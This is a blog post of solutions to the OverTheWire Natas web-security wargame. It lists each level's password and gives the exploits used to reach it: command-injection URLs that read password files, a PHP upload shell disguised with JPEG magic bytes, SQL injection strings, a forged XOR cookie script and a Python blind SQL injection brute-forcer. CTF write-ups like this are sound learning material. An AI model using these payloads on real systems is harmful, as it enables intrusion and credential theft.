---
layout:     post
title:      "Natas"
subtitle:   "Solutions"
date:       2016-01-22 9:00:00
author:     "Heeraj"
header-img: "img/post-bg-02.png"
---
<script type='text/javascript' src='//eclkmpbn.com/adServe/banners?tid=98477_161886_3&type=footer&size=468x60'></script>
<p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> </p>

<p>I spent last day an hour or something on natas , the website would be very familiar to you. It was the website from which I first started to learn linux commands and the same people who run banditoverwire. Actually came to know from wechall.net, well that was also new to me :) But I could assure you that if you want to start with web exploitation as a CTF point of you, this is http://natas.natas.labs.overthewire.org very good option.</p>

<p>Natas 00</p>

<p>See the source code.</p>

<blockquote>pass:gtVrDuiDfck831PqWsLEZy5gyDz1clto</blockquote>

<p>Natas 01</p>

<p>Go to developer option by clicking F12</p>

<blockquote>pass:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi</blockquote>

<p>Natas 02</p>

<p>Goto files directory</p>

<blockquote>pass:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14</blockquote>

<p>Natas 03</p>

<p>Open the robots.txt you will get the file which contain pass to next level.</p>

<blockquote>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</blockquote>

<p>Natas 04</p>

<p>Use a burp suite and change the referrer</p>

<blockquote>Referer: http://natas5.natas.labs.overthewire.org/ <br>
            pass:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
</blockquote>

<p>Natas 05</p>

<p>You have to change the cookie of login from 0 to 1, using edit my cookie or firebug</p>

<blockquote>pass:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</blockquote>

<p>Natas 06</p>

<p> You can easily get the secret using the page source, when you get the secret.
Give a post request using secret and a submit. Write a script or use postman in chrome.
</p>

<blockquote>pass:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</blockquote>

<p>Natas 07</p>

<p>Remote file inclusion</p>

<blockquote>pass:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe</blockquote>

<p>Natas 08</p>

<p>Exploit</p>

<blockquote><?phpecho base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));?></blockquote>

<blockquote>pass:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl</blockquote>

<p>Natas 09</p>

<p>Exploit</p>

<p>http://natas9.natas.labs.overthewire.org/?needle[]=ls&needle=;cat%20/etc/natas_webpass/natas10<p>

<blockquote>Pass:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu</blockquote>

<p>Natas 10</p>

<p>There are exactly 2 ways to solve the challenge, one is going back to challenge 9
and entering ".* /etc/natas_webpass/natas11"</p>

<p>Solution 2 would be by using line feed you can observer we can execute the command and %20 for space. So the exploit look like this.</p>

<blockquote>http://natas10.natas.labs.overthewire.org/?needle[]=.*%20/etc/natas_webpass/natas11&needle=%0acat%20.*%20/etc/natas_webpass/natas11</blockquote>

<blockquote>pass:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK</blockquote>

<p>Natas 11</p>

<p>Getting the key</p>

<blockquote>
<?php<br>
<br>
	$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");<br>
	$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D";<br>
	function xor_encrypt($in,$key) {<br>
		$text = $in;<br>
		$outText = '';<br>
		// Iterate through each character<br>
		for($i=0;$i<strlen($text);$i++) {<br>
			$outText .= $text[$i] ^ $key[$i % strlen($key)];<br>
		}<br>
		<br>
		return $outText;<br>
        }<br>
	$key = xor_encrypt(json_encode($defaultdata), base64_decode($cookie));<br>
	echo $key;<br>
	echo "\n";<br>
<br>
?><br>
</blockquote>

<p>Get the cookie</p>
<blockquote>
<?php<br>
	$defaultdata = array( "showpassword"=>"Yes", "bgcolor"=>"#ffffff");<br>
	function xor_encrypt($in) {<br>
	    $key = 'qw8J';<br>
	    $text = $in;<br>
	    $outText = '';<br>
	    // Iterate through each character<br>
	     for($i=0;$i<strlen($text);$i++) {<br>
		        $outText .= $text[$i] ^ $key[$i % strlen($key)];<br>
     	     }<br>
                return $outText;<br>
	}<br>
	$newcookie = base64_encode(xor_encrypt(json_encode($defaultdata)));<br>
	echo " \n ------------------------------------\n";<br>
	echo " \n             New cookie              \n";<br>
	echo $newcookie;<br>
<br>
	echo " \n ------------------------------------\n";<br>
?><br>
</blockquote>

<p>Add this cookie data</p>

<blockquote>pass: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3</blockquote>

<p>Natas 12</p>

<p>Upload burp and change the request of the file name.</p>

<p>pass: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY</p>

<p>Natas 13</p>

<p>exif_imagetype() reads the first bytes of an image and checks its signature.when you view the file you can see the first 4 character as that. So its gona bypass the exif_imagetype() as its only gona verify that it matches with the signature of jpg.</p>

<blockquote>\xFF\xD8\xFF\xE8 <?php passthru('cat /etc/natas_webpass/natas14'); ?></blockquote>

<p>pass : pass:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1</p>

<p>Natas 14</p>

<p>username = " or "1"="1<br>
password = " or "1"="1</p>

<p>pass:pass:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J</p>

<p>Natas 15</p>

<blockquote>
#/usr/bin/python<br>
__author__="hrj"<br>
<br>
import requests<br>
import string<br>
import re<br>
<br>
c = '1234567890' + string.ascii_lowercase  + string.ascii_uppercase<br>
password = ''<br>
<br>
#To find the length of the database<br>
print "------------------------------------------------------------------------"<br>
print "                Have patience , we will bring you the result            "<br>
print "------------------------------------------------------------------------"<br>
'''<br>
for i in range(1,50):<br>
    r = requests.get(('http://natas15.natas.labs.overthewire.org?username=natas16" AND (length(password)) ="'+str(i)), auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))<br>
    res = r.text<br>
    #print res<br>
    tmp = re.findall("exists",res)<br>
    if tmp:<br>
        print "Length: " + str(i)<br>
        break<br>
''' <br>
#To find the password<br>
for j in range(1,33):<br>
    for k in range(20,123):<br>
        r = requests.get(('http://natas15.natas.labs.overthewire.org?username=natas16" AND ascii(substr((password),'+str(j)+',1)) = "'+str(k)), auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))<br>
        res = r.text<br>
        #`print res<br>
        tmp = re.findall("exists",res)<br>
        if tmp:<br>
            password+=chr(k)<br>
            print "Guess Pass = " + password<br>
            break<br>
<br>
print "Last Result : " + password<br>
</blockquote>

<p>Wait for the next blog, will be soon back!</p>

<p>Thank you for reading the blog! </p>
